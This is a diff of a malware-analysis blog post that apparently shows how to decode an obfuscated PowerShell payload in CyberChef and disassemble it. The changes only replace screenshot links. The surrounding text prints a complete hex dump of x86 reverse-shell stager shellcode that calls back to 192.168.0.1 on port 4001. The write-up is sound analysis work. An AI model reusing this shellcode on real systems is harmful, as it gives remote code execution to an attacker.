@@ -27,7 +27,12 @@ We can identify the value of the arrays after a given sequence by looking for th
 
 Then it's a case of getting the Base64 encoded string, removing the concatenations and replacing the array values.
 
-![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/4de9e6db-b1b9-4609-932a-de568c74f327)
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b813cf1a-4d3a-4b1d-86ef-17d99456d3b5)
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d8739fc4-2063-4328-a35a-b8d931da62ae)
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/5108a2ac-dbb7-4ff2-a75c-c4623fc25fc8)
+
+
+
 
 Next, we'll add a From Base64 and Gunzip operator to reveal the following code:
 
@@ -68,7 +73,12 @@ This articale from SANS probably does a better job of explaining the grittier de
 But what we are interested in is the Base64 string.
 We'll throw it into CyberChef and add a From Base64 and To Hex operator to reveal the shellcode
 
-![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/1b56305a-7734-4042-bd4a-08c589135d82)
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/80ecde0b-f1b1-4185-a322-9f616a2fe4e7)
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7c49af16-e21f-4871-817b-017094a1c3ab)
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a544358b-3b91-426a-b8fb-d49f52f2c702)
+
+
+
 
 ```
 fc e8 8f 00 00 00 60 31 d2 89 e5 64 8b 52 30 8b 52 0c 8b 52 14 8b 72 28 31 ff 0f b7 4a 26 31 c0 ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 49 75 ef 52 8b 52 10 57 8b 42 3c 01 d0 8b 40 78 85 c0 74 4c 01 d0 8b 48 18 8b 58 20 01 d3 50 85 c9 74 3c 49 31 ff 8b 34 8b 01 d6 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4 03 7d f8 3b 7d 24 75 e0 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 58 5f 5a 8b 12 e9 80 ff ff ff 5d 68 33 32 00 00 68 77 73 32 5f 54 68 4c 77 26 07 89 e8 ff d0 b8 90 01 00 00 29 c4 54 50 68 29 80 6b 00 ff d5 6a 0a 68 c0 a8 00 01 68 02 00 0f a1 89 e6 50 50 50 50 40 50 40 50 68 ea 0f df e0 ff d5 97 6a 10 56 57 68 99 a5 74 61 ff d5 85 c0 74 0c ff 4e 08 75 ec 68 f0 b5 a2 56 ff d5 6a 00 6a 04 56 57 68 02 d9 c8 5f ff d5 8b 36 6a 40 68 00 10 00 00 56 6a 00 68 58 a4 53 e5 ff d5 93 53 6a 00 56 53 57 68 02 d9 c8 5f ff d5 01 c3 29 c6 75 ee c3
@@ -76,7 +86,12 @@ fc e8 8f 00 00 00 60 31 d2 89 e5 64 8b 52 30 8b 52 0c 8b 52 14 8b 72 28 31 ff 0f
 
 Then with this shellcode, we can use a x86 Dissassembler to reveal the instructions.
 
-![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/5615afaf-2a27-41af-8b79-f83bdcb3eb31)
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8408cee5-eb25-4b97-9c69-e4d3a2662760)
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/00b20d83-8eba-4fba-b1de-2773dd0d4b13)
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/f808fc0b-ad87-486e-a540-8a7bdcd0758d)
+
+
+
 
 To find the IP which the shell will call back to, we need to look for the PUSH instructions above the MOV ESI,ESP instruction, which is above multiple PUSH RAX insutrctions
 
